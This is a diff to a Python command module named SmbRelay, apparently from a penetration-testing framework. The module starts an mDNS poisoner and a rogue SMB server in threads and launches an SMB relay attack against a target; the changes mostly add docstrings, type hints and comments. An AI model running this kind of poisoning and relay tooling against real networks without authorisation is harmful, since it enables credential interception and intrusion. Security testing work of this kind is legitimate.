@@ -9,11 +9,21 @@ from threading import Thread
 
 @with_default_category("Relay Attacks")
 class SmbRelay(CommandSet):
-    def __init__(self) -> None:
-        super().__init__()
-        # Logging info to the logs from logguru
+    """[ Class containing smbrelay attack ]"""
 
-    def config_poison_and_server(self, mdns_poisoner, smbserver):
+    def __init__(self) -> None:
+
+        super().__init__()
+
+    def config_poison_and_server(
+        self, mdns_poisoner: MDNS, smbserver: SmbServer
+    ) -> None:
+        """[ Function to launch the threads that will control the mdns poisoner and the smb server]
+
+        Args:
+            mdns_poisoner (MDNS): [ variable with the mdns poisoner Object ]
+            smbserver (SmbServer): [ variable with the SmbServer Object ]
+        """
         self._cmd.poutput("Starting mdns poisoner")
         mdns_thread = Thread(target=mdns_poisoner.start_mdns_poisoning)
         mdns_thread.daemon = True
@@ -25,6 +35,7 @@ class SmbRelay(CommandSet):
         mdns_thread.start()
         smbserver_thread.start()
 
+        # I only wait for a thread because when you finish the process you have to finish
         smbserver_thread.join()
 
     argParser = Cmd2ArgumentParser(
@@ -39,6 +50,12 @@ class SmbRelay(CommandSet):
 
     @with_argparser(argParser)
     def do_smb_relay(self, args: argparse.Namespace) -> None:
+        """[ Command to perform smb_relay ]
+
+        Args:
+            args (argparse.Namespace): [Arguments passed to the smb_relay command]
+        """
+
         mdns_poisoner = MDNS(
             self._cmd.LHOST,
             self._cmd.IPV6,
@@ -46,7 +63,8 @@ class SmbRelay(CommandSet):
             self._cmd.INTERFACE,
         )
 
-        smbserver = SmbServer("0.0.0.0", self._cmd.LPORT, self._cmd.stdout)
+        # output in case of -SS command
+        smbserver = SmbServer(self._cmd.LHOST, self._cmd.LPORT, self._cmd.stdout)
 
         self._cmd.logger.info(
             f"""Starting smb relay attack using ip: {self._cmd.IP_TARGET} ipv6:{self._cmd.IPV6}
@@ -69,6 +87,7 @@ class SmbRelay(CommandSet):
             )
             attack.start()
             try:
+                # If ctrl+c then the process terminate and smb_relay exits
                 attack.join()
             except KeyboardInterrupt:
                 attack.terminate()
